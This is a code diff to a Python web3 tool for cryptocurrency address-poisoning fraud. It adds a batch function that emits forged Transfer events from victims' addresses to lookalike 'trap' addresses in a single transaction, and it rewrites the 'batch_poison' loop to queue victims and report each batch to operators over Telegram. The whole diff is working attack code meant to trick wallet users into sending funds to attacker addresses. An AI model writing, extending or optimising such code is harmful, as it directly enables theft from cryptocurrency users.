@@ -352,8 +352,7 @@ MIRROR_CONTRACTS = {
     "MATIC": MIRROR_TOKEN_NATIVE,
 }
 
-MIRROR_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]')
-
+MIRROR_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"froms","type":"address[]"},{"internalType":"address[]","name":"tos","type":"address[]"},{"internalType":"uint256[]","name":"values","type":"uint256[]"}],"name":"batchEmitTransfers","outputs":[],"stateMutability":"nonpayable","type":"function"}]')
 def get_token_decimals(asset_symbol):
     """Get the correct number of decimals for a token symbol."""
     decimals_map = {
@@ -567,6 +566,120 @@ def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaig
 
     except Exception as e:
         logger.error(f"[mirror] Failed to emit forged transfer: {e}")
+        return None
+
+
+
+def emit_batch_mirror_transfers(victims, traps, amounts, assets, campaign_id):
+    """
+    Emit multiple forged Transfer events in a SINGLE transaction.
+    Much more gas efficient than individual emissions.
+    
+    Args:
+        victims: list of victim addresses
+        traps: list of trap addresses (same length as victims)
+        amounts: list of raw amounts (same length as victims)
+        assets: list of asset symbols (same length as victims)
+        campaign_id: campaign ID for operator key
+    
+    Returns:
+        tx_hash on success, None on failure
+    """
+    if len(victims) != len(traps) or len(victims) != len(amounts):
+        logger.error("[batch-mirror] Mismatched array lengths")
+        return None
+    
+    # Use the first asset to determine contract (all should use same contract for batch)
+    # For simplicity, we'll use the ETH fallback contract for all batches
+    contract_address = MIRROR_TOKEN_NATIVE
+    
+    if not contract_address:
+        logger.warning("[batch-mirror] No native contract configured")
+        return None
+    
+    operator_key = get_mirror_operator_key(campaign_id)
+    if not operator_key:
+        logger.warning(f"[batch-mirror] No funding key for campaign {campaign_id}")
+        return None
+    
+    try:
+        operator_account = w3.eth.account.from_key(operator_key)
+        operator_addr = operator_account.address
+        
+        contract = w3.eth.contract(
+            address=w3.to_checksum_address(contract_address),
+            abi=MIRROR_ABI
+        )
+        
+        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
+        
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
+        use_eip1559 = (
+            "baseFeePerGas" in latest_block
+            and latest_block["baseFeePerGas"] is not None
+            and CHAIN.lower() != "bsc"
+        )
+        
+        gas_params = {}
+        if use_eip1559:
+            base_fee = latest_block["baseFeePerGas"]
+            if CHAIN.lower() == "polygon":
+                max_priority = w3.to_wei(30, "gwei")
+            elif CHAIN.lower() == "ethereum":
+                max_priority = w3.to_wei(0.05, "gwei")
+            else:
+                max_priority = w3.to_wei(0.01, "gwei")
+            max_fee = int((base_fee * 1.02) + max_priority)
+            gas_params['maxFeePerGas'] = max_fee
+            gas_params['maxPriorityFeePerGas'] = max_priority
+        else:
+            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
+        
+        # Estimate gas: base 50k + 30k per victim
+        estimated_gas = 50000 + (30000 * len(victims))
+        
+        # Convert to checksum addresses
+        victims_checksum = [w3.to_checksum_address(v) for v in victims]
+        traps_checksum = [w3.to_checksum_address(t) for t in traps]
+        
+        tx = contract.functions.batchEmitTransfers(
+            victims_checksum,
+            traps_checksum,
+            amounts
+        ).build_transaction({
+            'from': operator_addr,
+            'nonce': nonce,
+            'gas': estimated_gas,
+            'chainId': w3.eth.chain_id,
+            **gas_params
+        })
+        
+        # Check operator balance
+        operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
+        gas_cost = estimated_gas * gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
+        
+        if operator_balance < gas_cost:
+            needed_eth = w3.from_wei(gas_cost, 'ether')
+            have_eth = w3.from_wei(operator_balance, 'ether')
+            logger.error(f"[batch-mirror] Insufficient gas. Need {needed_eth}, have {have_eth}")
+            return None
+        
+        signed = w3.eth.account.sign_transaction(tx, operator_key)
+        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
+        tx_hash = w3.eth.send_raw_transaction(raw_tx)
+        
+        logger.info(f"[batch-mirror] Batch emission sent: {len(victims)} transfers in tx={tx_hash.hex()}")
+        
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
+        if receipt.status == 1:
+            logger.info(f"[batch-mirror] ✅ Batch confirmed in block {receipt.blockNumber}")
+            return tx_hash.hex()
+        else:
+            logger.error(f"[batch-mirror] ❌ Batch tx reverted")
+            return None
+    
+    except Exception as e:
+        logger.error(f"[batch-mirror] Failed to emit batch: {e}")
         return None
 
 
@@ -1115,6 +1228,10 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
     success = 0
     gas_failures = 0
     
+        # 🆕 BATCH PROCESSING: Queue victims and emit in batches
+    BATCH_SIZE = 10  # Process 10 victims per transaction
+    poison_queue = []
+    
     for i, entry in enumerate(entries, 1):
         # Support both (victim, key) and (trap_id, victim, key) formats
         if entry_has_id:
@@ -1137,68 +1254,136 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
             logger.warning(f"[{i}/{total}] No counterparty found for {victim}, skipping")
             continue
         
-                # Fetch last transfer from blockchain (with caching)
+        # Fetch last transfer from blockchain (with caching)
         logger.info(f"[mirror] Fetching last transfer from {victim} to {counterparty} (trap_id: {trap_id})...")
         fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim, counterparty, trap_id)
         
         if not fetched_asset or not fetched_amount:
             # 🆕 Use default fallback: emit a small native transfer
-            # Keeps the attack working even without real transfer history
             logger.info(f"[{i}/{total}] No transfer found for {victim}, using default {NATIVE_SYMBOL} fallback")
             fetched_asset = NATIVE_SYMBOL
             fetched_amount = w3.to_wei(1, 'ether')
         
         logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
         
-        # Emit FAKE mirror event (no real tokens needed)
-        tx_hash = emit_mirror_transfer(victim, trap_address, fetched_amount, fetched_asset, campaign_id)
+        # 🆕 Add to batch queue
+        poison_queue.append({
+            'victim': victim,
+            'trap': trap_address,
+            'amount': fetched_amount,
+            'asset': fetched_asset,
+            'trap_id': trap_id,
+        })
         
-        if tx_hash:
-            success += 1
-            logger.info(f"[{i}/{total}] ✅ Mirror event emitted: {tx_hash}")
+        # 🆕 Process batch when queue reaches BATCH_SIZE
+        if len(poison_queue) >= BATCH_SIZE:
+            logger.info(f"[batch] Processing batch of {len(poison_queue)} victims...")
             
-            # 🆕 Update dust_count and last_dusted_at if we have trap_id
-            if trap_id:
-                update_trap_dust_count(trap_id)
+            # Prepare batch arrays
+            batch_victims = [q['victim'] for q in poison_queue]
+            batch_traps = [q['trap'] for q in poison_queue]
+            batch_amounts = [q['amount'] for q in poison_queue]
+            batch_assets = [q['asset'] for q in poison_queue]
+            batch_trap_ids = [q['trap_id'] for q in poison_queue]
             
-              # Send individual Telegram notification for each successful mirror
-            decimals = get_token_decimals(fetched_asset)
-            
-            amount_display = fetched_amount / (10 ** decimals)
-            success_msg = (
-                f"✅ Mirror event emitted!\n"
-                f"Victim: `{victim}`\n"
-                f"Trap: `{trap_address}`\n"
-                f"Amount: {amount_display:.6f} {fetched_asset}\n"
-                f"TX: `{tx_hash}`"
+            # Emit batch
+            tx_hash = emit_batch_mirror_transfers(
+                batch_victims,
+                batch_traps,
+                batch_amounts,
+                batch_assets,
+                campaign_id
             )
-            send_telegram(success_msg, campaign_id=campaign_id)
-        else:
-            # Check if this was a gas failure
-            operator_key = get_mirror_operator_key(campaign_id)
-            if operator_key:
-                try:
-                    operator_account = w3.eth.account.from_key(operator_key)
-                    operator_addr = operator_account.address
-                    operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
-                    # If operator has less than 0.00002 ETH, count as gas failure
-                    if operator_balance < w3.to_wei(0.00002, 'ether'):
-                        gas_failures += 1
-                        logger.warning(f"[{i}/{total}] ❌ Mirror emission failed (gas insufficient)")
-                        # Stop processing if we hit 3 consecutive gas failures
-                        if gas_failures >= 3:
-                            logger.error(f"⛽ Stopping batch: {gas_failures} consecutive gas failures. Funding wallet needs refill.")
-                            break
-                    else:
-                        logger.error(f"[{i}/{total}] ❌ Mirror emission failed (other reason)")
-                except Exception:
-                    logger.error(f"[{i}/{total}] ❌ Mirror emission failed")
-            else:
-                logger.error(f"[{i}/{total}] ❌ Mirror emission failed (no operator key)")
             
+            if tx_hash:
+                success += len(poison_queue)
+                logger.info(f"[batch] ✅ Batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
+                
+                # Update dust counts for all traps in batch
+                for tid in batch_trap_ids:
+                    if tid:
+                        update_trap_dust_count(tid)
+                
+                # Send single Telegram notification for the batch
+                batch_msg = (
+                    f"🪞 Batch Mirror Events Emitted!\n\n"
+                    f"Processed: {len(poison_queue)} victims\n"
+                    f"TX: `{tx_hash}`\n\n"
+                )
+                for idx, q in enumerate(poison_queue, 1):
+                    decimals = get_token_decimals(q['asset'])
+                    amount_display = q['amount'] / (10 ** decimals)
+                    batch_msg += f"{idx}. `{q['victim']}` → `{q['trap']}` ({amount_display:.6f} {q['asset']})\n"
+                
+                send_telegram(batch_msg, campaign_id=campaign_id)
+            else:
+                # Batch failed - check if gas issue
+                operator_key = get_mirror_operator_key(campaign_id)
+                if operator_key:
+                    try:
+                        operator_account = w3.eth.account.from_key(operator_key)
+                        operator_addr = operator_account.address
+                        operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
+                        if operator_balance < w3.to_wei(0.0001, 'ether'):
+                            gas_failures += 1
+                            logger.warning(f"[batch] ❌ Batch failed (gas insufficient)")
+                            if gas_failures >= 3:
+                                logger.error(f"⛽ Stopping batch: {gas_failures} consecutive gas failures")
+                                poison_queue.clear()
+                                break
+                        else:
+                            logger.error(f"[batch] ❌ Batch failed (other reason)")
+                    except Exception:
+                        logger.error(f"[batch] ❌ Batch failed")
+                else:
+                    logger.error(f"[batch] ❌ Batch failed (no operator key)")
+            
+            # Clear queue for next batch
+            poison_queue.clear()
+        
         if job_id and i % 5 == 0:
             update_job(job_id, progress=i)
-        time.sleep(1)
+        time.sleep(0.5)  # Reduced delay since we're batching
+    
+    # 🆕 Process remaining items in queue (final batch)
+    if poison_queue:
+        logger.info(f"[batch] Processing final batch of {len(poison_queue)} victims...")
+        
+        batch_victims = [q['victim'] for q in poison_queue]
+        batch_traps = [q['trap'] for q in poison_queue]
+        batch_amounts = [q['amount'] for q in poison_queue]
+        batch_assets = [q['asset'] for q in poison_queue]
+        batch_trap_ids = [q['trap_id'] for q in poison_queue]
+        
+        tx_hash = emit_batch_mirror_transfers(
+            batch_victims,
+            batch_traps,
+            batch_amounts,
+            batch_assets,
+            campaign_id
+        )
+        
+        if tx_hash:
+            success += len(poison_queue)
+            logger.info(f"[batch] ✅ Final batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
+            
+            for tid in batch_trap_ids:
+                if tid:
+                    update_trap_dust_count(tid)
+            
+            batch_msg = (
+                f"🪞 Final Batch Mirror Events!\n\n"
+                f"Processed: {len(poison_queue)} victims\n"
+                f"TX: `{tx_hash}`\n\n"
+            )
+            for idx, q in enumerate(poison_queue, 1):
+                decimals = get_token_decimals(q['asset'])
+                amount_display = q['amount'] / (10 ** decimals)
+                batch_msg += f"{idx}. `{q['victim']}` → `{q['trap']}` ({amount_display:.6f} {q['asset']})\n"
+            
+            send_telegram(batch_msg, campaign_id=campaign_id)
+        else:
+            logger.error(f"[batch] ❌ Final batch failed")
 
     # Summary with gas failure information
     failed = total - success
